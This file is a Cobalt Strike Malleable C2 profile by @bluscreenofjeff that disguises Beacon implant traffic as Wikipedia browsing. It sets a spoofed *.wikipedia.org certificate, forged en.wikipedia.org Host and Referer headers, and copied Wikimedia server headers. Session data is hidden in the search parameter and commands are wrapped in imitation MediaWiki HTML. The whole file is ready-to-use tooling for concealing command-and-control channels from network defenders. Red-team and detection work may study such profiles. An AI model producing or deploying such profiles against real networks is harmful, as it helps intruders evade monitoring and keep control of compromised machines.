#
# Wikipedia
# 
# Author: @bluscreenofjeff
#

#set https cert info
https-certificate {
    set CN       "*.wikipedia.org"; #Common Name
    set C        "US"; #Country
    set L        "San Francisco"; #Locality
    set OU       "Wikimedia Foundation Inc"; #Organizational Unit Name
    set ST       "CA"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "60000";
set jitter    "20";

#default useragent for HTTP comms
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "235";

http-get {

    set uri "/w/index.php";

    client {

        header "Host" "en.wikipedia.org";
        header "Accept" "text/html,application/xhtml+xml,application/xml;";
        header "Referer" "https://en.wikipedia.org/wiki/Main_Page";

        #session metadata
        metadata {
            base64url;
            parameter "search";
        }
        parameter "title" "Special%3ASearch";
        parameter "go" "Go";
    }


    server {

        header "Server" "mw1178.eqiad.wmnet";
        header "X-Powered-By" "HHVM/3.12.7";
        header "X-Content-Type-Options" "nosniff";
        header "P3P" "CP=This is not a P3P policy! See https://en.wikipedia.org/wiki/Special:CentralAutoLogin/P3P for more info.";
        header "Vary" "Accept-Encoding,X-Forwarded-Proto,Cookie,Authorization";

        #Beacon's tasks
        output {
            netbios;
            prepend "<!DOCTYPE html><html class=client-nojs lang=en dir=ltr><head><meta charset=UTF-8/><title>Wikipedia</title><script>document.documentElement.className = document.documentElement.className.replace( /(^|s)client-nojs(s|$)/, $1client-js$2 );</script><script>(window.RLQ=window.RLQ||[]).push(function(){mw.config.set({wgCanonicalNamespace:,wgCanonicalSpecialPageName:false,wgNamespaceNumber:0,,wgBetaFeaturesFeatures:[],wgMediaViewerOnClick:true,wgMediaViewerEnabledByDefault:true,wgVisualEditor:{pageLanguageCode:en,pageLanguageDir:ltr,usePageImages:true,usePageDescriptions:true},wgPreferredVariant:en,wgMFDisplayWikibaseDescriptions:{search:true,nearby:true,watchlist:true,tagline:false},wgRelatedArticles:null,wgRelatedArticlesUseCirrusSearch:true,wgRelatedArticlesOnlyUseCirrusSearch:false,wgULSCurrentAutonym:English,wgNoticeProject:wikipedia,wgCentralNoticeCookiesToDelete:[],wgCentralNoticeCategoriesUsingLegacy:[Fundraising,fundraising],wgCategoryTreePageCategoryOptions:{mode:0,hideprefix:20,showcount:true,namespaces:false},wgWikibaseItemId:";

            append ",wgCentralAuthMobileDomain:false,wgVisualEditorToolbarScrollOffset:0,wgEditSubmitButtonLabelPublish:false});mw.loader.state({ext.globalCssJs.user.styles:ready,ext.globalCssJs.site.styles:ready,site.styles:ready,noscript:ready,user.styles:ready,user:ready,user.options:loading,user.tokens:loading,wikibase.client.init:ready,ext.visualEditor.desktopArticleTarget.noscript:ready,ext.uls.interlanguage:ready,ext.wikimediaBadges:ready,mediawiki.legacy.shared:ready,mediawiki.legacy.commonPrint:ready,mediawiki.sectionAnchor:ready,mediawiki.skinning.interface:ready,skins.vector.styles:ready,ext.globalCssJs.user:ready,ext.globalCssJs.site:ready});mw.loader.implement(user.options@0j3lz3q,function($,jQuery,require,module){mw.user.options.set({variant:en});});mw.loader.implement(user.tokens@1dqfd7l,function ( $, jQuery, require, module )</script><link rel=stylesheet href=/w/load.php?debug=false&amp;lang=en&amp;modules=ext.uls.interlanguage%7Cext.visualEditor.desktopArticleTarget.noscript%7Cext.wikimediaBadges%7Cmediawiki.legacy.commonPrint%2Cshared%7Cmediawiki.sectionAnchor%7Cmediawiki.skinning.interface%7Cskins.vector.styles%7Cwikibase.client.init&amp;only=styles&amp;skin=vector/><script async= src=/w/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=vector></script><meta name=ResourceLoaderDynamicStyles content=/><link rel=stylesheet href=/w/load.php?debug=false&amp;lang=en&amp;modules=site.styles&amp;only=styles&amp;skin=vector/>";

            print;
        }
    }
}

http-post {
    
    set uri "/wiki";
    set verb "GET";

    client {

        header "Host" "en.wikipedia.org";
        header "Accept" "text/html,application/xhtml+xml,application/xml;";

        #session ID
        id {
            base64url;
            prepend "/";
            uri-append;
        }


        #Beacon's responses
        output {
            base64url;
            prepend "https://en.wikipedia.org/w/index.php?search=";
            append "&title=Special%3ASearch&go=Go";
            header "Referer";
        }
    }

    server {

        header "Server" "mw1178.eqiad.wmnet";
        header "X-Powered-By" "HHVM/3.12.7";
        header "X-Content-Type-Options" "nosniff";
        header "P3P" "CP=This is not a P3P policy! See https://en.wikipedia.org/wiki/Special:CentralAutoLogin/P3P for more info.";
        header "Vary" "Accept-Encoding,X-Forwarded-Proto,Cookie,Authorization";

        #empty
        output {

            prepend "<body class=mediawiki ltr sitedir-ltr mw-hide-empty-elt ns-0 ns-subject page-Test rootpage-Test skin-vector action-view><div id=mw-page-base class=noprint></div><div id=mw-head-base class=noprint></div><div id=content class=mw-body role=main><a id=top></a><div id=siteNotice><!-- CentralNotice --></div><div class=mw-indicators><div id=mw-indicator-pp-default class=mw-indicator><a href=/wiki/Wikipedia:Protection_policy#semi title=This article is semi-protected due to vandalism><img alt=Page semi-protected src=//upload.wikimedia.org/wikipedia/commons/thumb/f/fc/Padlock-silver.svg/20px-Padlock-silver.svg.png width=20 height=20 srcset=//upload.wikimedia.org/wikipedia/commons/thumb/f/fc/Padlock-silver.svg/30px-Padlock-silver.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/fc/Padlock-silver.svg/40px-Padlock-silver.svg.png 2x data-file-width=128 data-file-height=128 /></a></div></div><h1 id=firstHeading class=firstHeading lang=en>Wikipedia</h1><div id=bodyContent class=mw-body-content><div id=siteSub>From Wikipedia, the free encyclopedia</div><div id=contentSub><span class=mw-redirectedfrom>ￂﾠￂﾠ(Redirected from <a href=/w/index.php?title=Testing&amp;redirect=no class=mw-redirect title=Testing>Testing</a>)</span></div><div id=jump-to-nav class=mw-jump>Jump to:<a href=#mw-head>navigation</a>,<a href=#p-search>search</a></div><div id=mw-content-text lang=en dir=ltr class=mw-content-ltr><script>function mfTempOpenSection(id){var block=document.getElementById(mf-section-+id);block.className+= open-block;block.previousSibling.className+= open-block;}</script><table class=plainlinks metadata ambox ambox-content role=presentation><tr><td class=mbox-image><div style=width:52px><img alt= src=//upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Sandbox_Not.svg/50px-Sandbox_Not.svg.png width=50 height=50 srcset=//upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Sandbox_Not.svg/75px-Sandbox_Not.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Sandbox_Not.svg/100px-Sandbox_Not.svg.png 2x data-file-width=766 data-file-height=766 /></div></td>";

            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "text/html";
    }
}
